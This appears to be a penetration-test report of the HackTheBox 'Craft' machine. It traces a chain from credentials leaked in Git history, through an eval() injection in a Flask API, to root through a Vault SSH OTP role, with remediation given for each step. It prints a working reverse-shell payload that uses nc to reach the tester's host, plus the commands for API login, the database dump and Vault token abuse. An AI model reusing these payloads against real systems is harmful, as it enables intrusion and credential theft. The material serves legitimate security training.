---
title: "Credential Chain Compromise — From Git History Leak to Vault Root"
description: "A professional assessment of a Linux environment running Gogs, a Flask API, and HashiCorp Vault. The chain starts with credentials buried in Git history, escalates through an eval() injection in the API, pivots across containers with Ligolo-ng, extracts plaintext database credentials, recovers an SSH private key from a private repository, and ends with root access via a Vault root token and the SSH OTP engine."
date: 2026-10-09
status: "research"
category: "Red Team"
stack: [Gogs, Flask, HashiCorp Vault, MySQL, Docker, Ligolo-ng, Python, SSH]
tags: [gogs, credential-leak, git-history, rce, eval-injection, hashicorp-vault, ssh-otp, container-escape, pivoting, pentest-report]
---

**Target:** `10.129.68.146` (craft.htb)
**Assessment Type:** External Network / Linux Host
**Testing Period:** 5-6 October 2026
**Overall Risk Rating:** **CRITICAL**

---

## Executive Summary

The assessment identified a complete compromise of a Linux host through a chain of five vulnerabilities and misconfigurations. Starting from an unauthenticated network position with no credentials, the tester obtained root access in approximately four hours.

The attack path begins with a **Gogs instance** (a self-hosted Git service) exposed on port 443. The public repository `craft-api` contained a commit history that leaked credentials for the user `dinesh`. Using those credentials, the tester authenticated to the API and exploited a **Python `eval()` injection** in the `abv` parameter of the `/api/brew/` endpoint, achieving remote code execution inside a Docker container.

From the container, the tester performed internal network reconnaissance, identified a MySQL database on a separate container, and pivoted using **Ligolo-ng**. Application source code in the container exposed **plaintext MySQL credentials**, which led to a database dump containing plaintext passwords for three users. One of those users (`gilfoyle`) had access to a private Gogs repository containing an **SSH private key** (with the passphrase stored alongside it).

Using the SSH key, the tester accessed the host as `gilfoyle` and discovered a **HashiCorp Vault root token** stored in a hidden file. With the token, the tester enumerated the Vault secrets engines and abused the **SSH OTP engine** to generate a one-time password for `root@127.0.0.1`, obtaining root access to the host.

### Business Impact

A complete compromise of the Linux host and all services running on it. An attacker with root access can access all data stored on the host, modify or delete any configuration, pivot to internal network segments, and use the compromised Vault instance to access every secret it manages.

For a full technical deep dive into Gogs credential leaks and the Vault SSH OTP engine, see: **[Gogs Credential Leaks and Vault SSH OTP →](/research/gogs-credential-leaks-vault-ssh-otp)**.

### Immediate Actions Required

| Priority | Action | Timeline |
|---|---|---|
| **P0** | Rotate all credentials leaked in Git history; audit every commit | 24 hours |
| **P0** | Remove `eval()` from the API; use safe JSON parsing | 24 hours |
| **P0** | Revoke the Vault root token; audit Vault access | 24 hours |
| **P0** | Restrict the SSH OTP engine to non-root users | 48 hours |
| **P1** | Remove plaintext credentials from application source | 1 week |
| **P1** | Rotate the SSH key and remove the passphrase from the repository | 1 week |
| **P2** | Implement network segmentation between containers | 2 weeks |

---

## Scope and Methodology

### In-Scope

- Single host: `10.129.68.146` (Linux, Debian)
- All TCP services exposed by the host: SSH (22, 6022), HTTPS (443)
- The Gogs instance, the Flask API, and the HashiCorp Vault service
- The internal Docker network (`172.20.0.0/16`) reachable from the compromised container

### Out-of-Scope

- Any host other than `10.129.68.146`. Only this IP is reachable from the assessment network.

### Methodology

The assessment followed the PTES (Penetration Testing Execution Standard):

1. **Reconnaissance** — Port scanning, service enumeration
2. **Initial Access** — Gogs enumeration, credential leak in commit history
3. **Foothold** — API authentication, `eval()` injection, RCE in container
4. **Enumeration** — Container network discovery, MySQL database access
5. **Privilege Escalation** — SSH key from Gogs, Vault root token, SSH OTP abuse
6. **Post-Exploitation** — Root access, credential extraction

---

## Reconnaissance

Initial port scanning revealed three exposed services:

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6
443/tcp  open  ssl/http nginx 1.15.8
6022/tcp open  ssh      Golang x/crypto/ssh server
```

Port 443 served a landing page that revealed two additional hostnames: `api.craft.htb` and `gogs.craft.htb`.

![Homepage con enlaces a los servicios api y gogs](/images/articles/gogs-vault-credential-chain-compromise/target-homepage.png)

The API exposed a Swagger UI (version 3.19.0), which was noted but not pursued — Swagger's known CVEs at that version require interaction from an authenticated user, and the more direct path was through the Git service.

![Swagger UI expuesto en el servicio de API](/images/articles/gogs-vault-credential-chain-compromise/swagger-ui.png)

---

## Findings

### Finding 1 — Credentials Leaked in Gogs Commit History

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 8.7 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:L/SI:L/SA:N` |
| **CWE** | CWE-312 (Cleartext Storage of Sensitive Information) |
| **MITRE ATT&CK** | T1552.001 (Credentials In Files) |

**Description**

The Gogs instance on `gogs.craft.htb` hosted a public repository called `craft-api`. Browsing the commit history of the file `test.py` revealed that an earlier commit contained hardcoded credentials for the API user `dinesh`. The credentials were removed in a later commit, but the Git history preserved them.

**Evidence**

The repository's commit history showed a previous version of `test.py` with the credentials visible:

```python
response = requests.get('https://api.craft.htb/api/auth/login',
  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
```

![Historial de commits de Gogs mostrando las credenciales de dinesh](/images/articles/gogs-vault-credential-chain-compromise/gogs-commit-history.png)

**Impact**

The tester obtained valid API credentials for `dinesh`, enabling authentication to the Flask API and the subsequent RCE (Finding 2).

**Remediation**

- Never commit credentials to a Git repository. Use environment variables or a secret manager.
- If credentials are accidentally committed, rotate them immediately — removing them from the latest commit is not enough.
- Use `git-secrets`, `trufflehog`, or `gitleaks` as pre-commit hooks.
- Audit all public repositories for historical credential leaks.

---

### Finding 2 — Remote Code Execution via eval() in the API

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.4 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **CWE** | CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code) |
| **MITRE ATT&CK** | T1190 (Exploit Public-Facing Application) |

**Description**

The Flask API on `api.craft.htb` exposes a `/api/brew/` endpoint that accepts a JSON payload. The `abv` parameter of this payload is passed to Python's `eval()` function without sanitization.

**Evidence — Authentication**

Using the credentials from Finding 1, the tester authenticated to the API and obtained a JWT token:

```bash
curl -k -X POST https://api.craft.htb/api/auth/login \
  -u 'dinesh:4aUh0A8PbVJxgd'
```

![Autenticación exitosa contra el endpoint /api/auth/login](/images/articles/gogs-vault-credential-chain-compromise/api-authentication.png)

Response:

```json
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."}
```

**Evidence — Vulnerable code**

The vulnerable code was identified in the Gogs repository at `craft_api/api/brew/endpoints/brew.py`:

```python
brew_dict['abv'] = eval(brew_dict['abv'])
```

![Código vulnerable en brew.py: la función eval() sobre el parámetro abv](/images/articles/gogs-vault-credential-chain-compromise/eval-injection-code.png)

**Evidence — Exploitation**

The tester crafted a malicious `abv` value that executes a reverse shell:

```python
brew_dict['abv'] = '__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.127 443 >/tmp/f")'
```

The API executed the Python code and established a reverse shell. The shell ran as `root` inside a Docker container.

![Shell como root dentro del contenedor de la API](/images/articles/gogs-vault-credential-chain-compromise/reverse-shell-container.png)

**Impact**

The tester obtained a shell inside the API container. The container ran as `root`, allowing full control and pivot to other containers on the same Docker network.

**Remediation**

- Never use `eval()` on user-supplied input. Use `json.loads()` or explicit type conversion.
- Validate and sanitize all API inputs against a strict schema.
- Run containers with a non-root user and drop unnecessary capabilities.
- Implement network policies to restrict container-to-container communication.

---

### Finding 3 — Container Network Pivoting and MySQL Credential Exposure

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 7.1 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| **CWE** | CWE-312 (Cleartext Storage of Sensitive Information) |
| **MITRE ATT&CK** | T1552.001 (Credentials In Files), T1210 (Exploitation of Remote Services) |

**Description**

From the compromised container, the tester performed internal network reconnaissance and discovered multiple containers on `172.20.0.0/16`. Using **Ligolo-ng**, a tunnel was created to access the internal network from the attacker's machine.

![Túnel de Ligolo-ng hacia la red interna 172.20.0.0/16](/images/articles/gogs-vault-credential-chain-compromise/ligolo-pivot-tunnel.png)

A MySQL database was identified on `172.20.0.4:3306`. Application source code inside the container (`/opt/app/craft_api/settings.py`) contained plaintext credentials:

```
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
```

The tester connected to the database and dumped the `user` table, which contained plaintext passwords for three users:

```
+----+----------+----------------+
| id | username | password       |
+----+----------+----------------+
|  1 | dinesh   | 4aUh0A8PbVJxgd |
|  4 | ebachman | llJ77D8QFkLPQB |
|  5 | gilfoyle | ZEU3N8WNM2rh4T |
+----+----------+----------------+
```

**Impact**

The tester obtained plaintext credentials for three users, including `gilfoyle`, who had access to a private Gogs repository containing an SSH private key.

**Remediation**

- Never store plaintext credentials in application source code. Use environment variables or a secrets manager.
- Use a dedicated, low-privileged database user for the application.
- Implement network segmentation between containers.


---

### Finding 4 — SSH Private Key and Passphrase Stored in Gogs Repository

| Attribute | Value |
|---|---|
| **Severity** | High |
| **CVSS 4.0** | 8.6 |
| **Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N` |
| **CWE** | CWE-312 (Cleartext Storage of Sensitive Information) |
| **MITRE ATT&CK** | T1552.004 (Private Keys) |

**Description**

After obtaining `gilfoyle` credentials from the MySQL database, the tester logged into Gogs and found a private repository called `craft-infra`. This repository contained an SSH private key (`id_rsa`) and, in a separate file, the passphrase for that key. The passphrase was the same as the Gogs password (`ZEU3N8WNM2rh4T`).

**Evidence**

The private repository contained an SSH private key and passphrase:

![Repositorio privado craft-infra con la clave SSH y la passphrase en texto plano](/images/articles/gogs-vault-credential-chain-compromise/gogs-private-repo-ssh-key.png)

![Contenido del archivo id_rsa recuperado desde Gogs](/images/articles/gogs-vault-credential-chain-compromise/id-rsa-ssh-key.png)

The tester copied the key and connected to the host:

```bash
ssh -i id_rsa gilfoyle@craft.htb
Enter passphrase for key 'id_rsa': ZEU3N8WNM2rh4T
```

**Impact**

The tester obtained SSH access to the host as `gilfoyle`, providing access to the filesystem and the Vault token (Finding 5).

**Remediation**

- Never store SSH private keys in Git repositories.
- Use SSH certificates or a hardware security module instead of static keys.
- If a key is committed, rotate it immediately.
- Audit all repositories for private keys and secrets.

---

### Finding 5 — HashiCorp Vault Root Token Exposed and SSH OTP Abuse

| Attribute | Value |
|---|---|
| **Severity** | Critical |
| **CVSS 4.0** | 9.3 |
| **Vector** | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| **CWE** | CWE-522 (Insufficiently Protected Credentials) |
| **MITRE ATT&CK** | T1552.001 (Credentials In Files), T1078.003 (Local Accounts) |

**Description**

While enumerating the `gilfoyle` home directory, the tester found a hidden file called `.vault-token`. This file contained a **root token** for the HashiCorp Vault instance running on `vault.craft.htb:8200`. The token had the `root` policy, which grants unrestricted access to all Vault resources.

Using the token, the tester enumerated the secrets engines and found an SSH secrets engine mounted at `ssh/`. This engine was configured with an OTP role (`root_otp`) that allows generating one-time passwords for `root@127.0.0.1`.

The tester generated an OTP and used it to SSH into the host as `root`:

```bash
export VAULT_ADDR=https://vault.craft.htb:8200/
vault write -field=key ssh/creds/root_otp ip=127.0.0.1
7f0afe29-09e8-20f3-350e-1b49fbe0c02b

ssh root@127.0.0.1
Password: 7f0afe29-09e8-20f3-350e-1b49fbe0c02b
```

**Evidence — Vault token:**

```bash
gilfoyle@craft:~$ cat .vault-token
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9

gilfoyle@craft:~$ vault token lookup
Key                 Value
---                 -----
accessor            1dd7b9a1-f0f1-f230-dc76-46970deb5103
creation_time       1549678834
creation_ttl        0s
display_name        root
id                  f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
orphan              true
path                auth/token/root
policies            [root]
ttl                 0s
```

Three indicators of compromise stand out: `policies: [root]`, `creation_ttl: 0s`, and `orphan: true`. Together, they make the token a permanent, unrevokable backdoor.

**Evidence — Vault secrets engines:**

```bash
gilfoyle@craft:~$ vault secrets list
Path          Type         Accessor
----          ----         --------
cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5
identity/     identity     identity_56533c34
secret/       kv           kv_2d9b0109
ssh/          ssh          ssh_3bbd5276
sys/          system       system_477ec595
```

**Evidence — OTP generation:**

```bash
gilfoyle@craft:~$ vault write -field=key ssh/creds/root_otp ip=127.0.0.1
7f0afe29-09e8-20f3-350e-1b49fbe0c02b
```

**Impact**

The tester obtained root access to the host. Every secret managed by Vault was accessible.

**Remediation**

- Never store Vault tokens in plaintext on the filesystem. Use a token helper.
- Revoke the root token and replace it with a token that has the minimum required permissions.
- Configure the SSH OTP engine to generate credentials for a non-root user, or restrict the role to specific IPs.
- Enable audit logging on Vault and monitor for token usage anomalies.
- Rotate the Vault root token on a regular basis.

---

## Attack Chain

The five findings chain together into a single path from an unauthenticated network position to root access.

```
[1] Port scan → 22, 443, 6022
    │
    ▼
[2] Web enumeration → api.craft.htb, gogs.craft.htb
    │
    ▼
[3] Gogs enumeration → commit history leaks dinesh credentials
    │
    ▼
[4] API authentication → JWT token
    │
    ▼
[5] eval() injection → reverse shell as root in container
    │
    ▼
[6] Container pivoting → Ligolo-ng tunnel to 172.20.0.0/16
    │
    ▼
[7] MySQL access → dump user table → gilfoyle : ZEU3N8WNM2rh4T
    │
    ▼
[8] SSH key from Gogs → private repo craft-infra
    │
    ▼
[9] SSH access as gilfoyle
    │
    ▼
[10] Vault root token → ~/.vault-token
     │
     ▼
[11] Vault enumeration → ssh/ engine
     │
     ▼
[12] OTP generation → ssh root@127.0.0.1 → root.txt
```

---

## Recommendations Summary

| Priority | Finding | Recommendation |
|---|---|---|
| P0 | Credentials in Git history | Rotate all leaked credentials; audit every commit |
| P0 | RCE via eval() | Remove eval(); use safe parsing |
| P0 | Vault root token | Revoke token; rotate secrets; enable audit logging |
| P0 | SSH OTP root role | Restrict to non-root users or specific IPs |
| P1 | Plaintext DB credentials | Use secrets manager; remove from source |
| P1 | SSH key in repository | Rotate key; never store keys in Git |
| P2 | Container network | Implement network segmentation |

---

## Appendix — Tools and References

**Tools used in this assessment:**

- `nmap` — port scanning and service detection
- `Gogs` — Git service enumeration, commit history review
- `curl` / `requests` — API authentication and exploitation
- `Ligolo-ng` — network pivoting from container
- `mysql` — database access and credential dump
- `vault` — Vault CLI for token enumeration and OTP generation
- `ssh` — remote access with key and OTP

**Full technical deep dive:** [Gogs Credential Leaks and Vault SSH OTP →](/research/gogs-credential-leaks-vault-ssh-otp)

**References:**

- HashiCorp Vault Docs — SSH Secrets Engine (OTP mode)
- MITRE ATT&CK T1552 — Unsecured Credentials
- MITRE ATT&CK T1190 — Exploit Public-Facing Application

---

## Takeaway

The chain demonstrates how a sequence of misconfigurations — credentials in Git history, `eval()` on user input, plaintext database credentials, an SSH key in a repository, and a Vault root token on disk — combine into a full system compromise.

The most consequential finding is the **Vault root token exposed in a hidden file**. Combined with an SSH OTP role configured for `root`, it provided a direct path to root access.

The second lesson is that **Git history is permanent**. Removing credentials from the latest commit does not remove them from the repository.

The third lesson is that **plaintext secrets in source code and configuration files are a recurring pattern**. Each is trivial to fix in isolation, but together they form a complete attack path.
